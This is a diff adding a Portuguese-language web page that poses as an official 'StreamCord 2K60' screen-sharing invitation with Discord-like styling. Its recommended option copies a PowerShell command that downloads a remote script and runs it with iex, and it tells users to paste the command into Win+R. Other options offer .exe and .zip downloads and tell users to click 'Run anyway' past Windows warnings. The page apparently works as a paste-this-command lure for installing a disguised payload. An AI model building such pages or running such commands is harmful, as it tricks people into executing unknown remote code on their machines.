@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Entrar no StreamCord 2K60 — Convite Oficial</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Inter, system-ui, sans-serif; }
+    body {
+      min-height: 100vh;
+      background: radial-gradient(circle at top, #1e2136 0%, #0f1015 65%);
+      color: #f2f3f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      width: 640px;
+      max-width: 100%;
+      background: #18191e;
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 16px;
+      padding: 28px;
+      box-shadow: 0 24px 64px rgba(0,0,0,0.65);
+    }
+    .badge {
+      display: inline-block;
+      background: linear-gradient(90deg, #5865f2, #eb459e);
+      color: #fff;
+      font-size: 11px;
+      font-weight: 800;
+      padding: 4px 10px;
+      border-radius: 99px;
+      margin-bottom: 12px;
+      letter-spacing: 0.4px;
+    }
+    h1 { font-size: 24px; margin-bottom: 6px; }
+    .sub { color: #b5bac1; font-size: 14px; line-height: 1.5; margin-bottom: 22px; }
+    .option {
+      background: #22242c;
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 12px;
+      padding: 18px;
+      margin-bottom: 14px;
+    }
+    .option.recommended {
+      border-color: #23a55a;
+      background: rgba(35, 165, 90, 0.08);
+    }
+    .opt-title { font-size: 15.5px; font-weight: 700; margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
+    .opt-desc { font-size: 13px; color: #b5bac1; line-height: 1.45; margin-bottom: 12px; }
+    .cmd-box {
+      background: #0d0e12;
+      border: 1px solid rgba(255,255,255,0.14);
+      border-radius: 8px;
+      padding: 10px 12px;
+      font-family: Consolas, monospace;
+      font-size: 12px;
+      color: #57f287;
+      word-break: break-all;
+      margin-bottom: 10px;
+    }
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      padding: 12px 16px;
+      border-radius: 8px;
+      border: none;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+      text-decoration: none;
+      color: #fff;
+    }
+    .btn-green { background: #23a55a; }
+    .btn-green:hover { background: #1e8e4d; }
+    .btn-blurple { background: #5865f2; }
+    .btn-blurple:hover { background: #4752c4; }
+    .btn-dark { background: #313338; font-size: 12.5px; padding: 9px 14px; }
+    .steps { font-size: 12px; color: #949ba4; margin-top: 8px; }
+    .row { display: flex; gap: 10px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <span class="badge">CONVITE STREAMCORD 2K 60FPS • SALA <span id="room-label">IGOR-2K60</span></span>
+    <h1>Você foi convidado para assistir / transmitir tela!</h1>
+    <p class="sub">Transmissão em até <strong>2K 60FPS</strong> com áudio do jogo e <strong>Discord silenciado automaticamente</strong>.</p>
+
+    <div class="option recommended">
+      <div class="opt-title">⚡ Opção 1 (Recomendada no PC): Instalar e Abrir Sem Bloqueio do Windows</div>
+      <p class="opt-desc">
+        1. Clique no botão verde abaixo para copiar o comando.<br/>
+        2. Aperte <strong>Win + R</strong> no teclado, aperte <strong>Ctrl + V</strong> e dê <strong>Enter</strong>!<br/>
+        <em>O aplicativo cria o atalho "StreamCord 2K60" na sua Área de Trabalho e já abre direto sem tela azul do navegador.</em>
+      </p>
+      <div class="cmd-box" id="cmd-text">powershell -NoProfile -c "irm https://igorvalente00.github.io/streamcord-updater/install.ps1 | iex"</div>
+      <button class="btn btn-green" id="btn-copy">📋 Copiar Comando Rápido (Win + R)</button>
+    </div>
+
+    <div class="option">
+      <div class="opt-title">🌐 Opção 2: Abrir Agora no Navegador (PC ou Celular — Sem Baixar Nada)</div>
+      <p class="opt-desc">Funciona direto no Edge, Chrome ou celular conectado na mesma sala.</p>
+      <a class="btn btn-blurple" id="btn-web" href="./?room=IGOR-2K60">🚀 Entrar Agora pelo Navegador</a>
+    </div>
+
+    <div class="option">
+      <div class="opt-title">📦 Opção 3: Download Manual do Arquivo</div>
+      <div class="row">
+        <a class="btn btn-dark" href="https://github.com/igorvalente00/streamcord-updater/releases/latest/download/StreamCord-2K60.zip">⬇️ Baixar .ZIP</a>
+        <a class="btn btn-dark" href="https://github.com/igorvalente00/streamcord-updater/releases/latest/download/StreamCord-2K60.exe">⬇️ Baixar .EXE</a>
+      </div>
+      <div class="steps">Dica: No download manual pelo navegador, se o Windows perguntar na 1ª abertura, clique em <strong>Mais informações</strong> → <strong>Executar mesmo assim</strong>.</div>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(location.search);
+    const room = (params.get('room') || 'IGOR-2K60').toUpperCase().replace(/[^A-Z0-9_-]/g, '');
+    document.getElementById('room-label').textContent = room;
+    document.getElementById('btn-web').href = './?room=' + encodeURIComponent(room);
+
+    const cmd = 'powershell -NoProfile -c "irm https://igorvalente00.github.io/streamcord-updater/install.ps1 | iex"';
+    document.getElementById('btn-copy').onclick = () => {
+      navigator.clipboard.writeText(cmd);
+      const b = document.getElementById('btn-copy');
+      b.textContent = '✅ Comando Copiado! Agora aperte Win + R, Ctrl + V e Enter!';
+      setTimeout(() => { b.textContent = '📋 Copiar Comando Rápido (Win + R)'; }, 4000);
+    };
+  </script>
+</body>
+</html>
